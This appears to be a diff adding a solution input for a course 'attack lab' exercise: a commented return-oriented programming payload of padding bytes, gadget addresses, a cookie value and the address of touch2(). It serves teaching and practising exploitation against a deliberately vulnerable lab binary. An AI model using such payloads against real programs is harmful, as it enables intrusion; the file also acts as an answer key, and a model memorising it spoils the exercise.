@@ -1,0 +1,20 @@
+ff ff ff ff ff ff ff ff /* using 56 bytes of padding */ 
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+
+/* pop %rax, from bytes 2-5 getval_464() */
+42 1b 40 00 00 00 00 00
+
+/* Insert cookie into current stack frame after pop. When the pop happens, it will
+   increment the stack pointer and put the cookie into %rax */
+e7 e9 88 57 00 00 00 00 
+
+/* use 3-6 bytes of setval_214 () to movq %rax, %rdi */
+50 1b 40 00 00 00 00 00
+
+/* insert address of touch2() */
+8c 19 40 00 00 00 00 00
